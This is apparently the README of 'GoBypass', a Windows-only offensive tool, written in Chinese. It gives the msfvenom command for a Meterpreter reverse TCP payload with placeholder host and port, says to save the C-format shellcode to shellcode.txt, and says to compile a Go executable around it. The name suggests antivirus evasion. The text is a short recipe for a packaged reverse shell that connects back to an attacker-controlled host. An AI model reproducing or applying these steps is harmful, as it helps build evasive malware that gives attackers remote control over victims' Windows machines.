# GoBypass

该工具仅针对`Windows`系统

在`Kali`中使用`msfvenom`生成需要的`Payload`（注意使用`-f c`参数）

`msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=ip lport=port -f c`

复制出以下格式的`shellcode`并在当前目录新建`shellcode.txt`写入

```text
unsigned char buf[] = 
"\xfc\x48..."
......
"\xff\xe7...";
```

编译可执行文件：`go build -o test.exe`
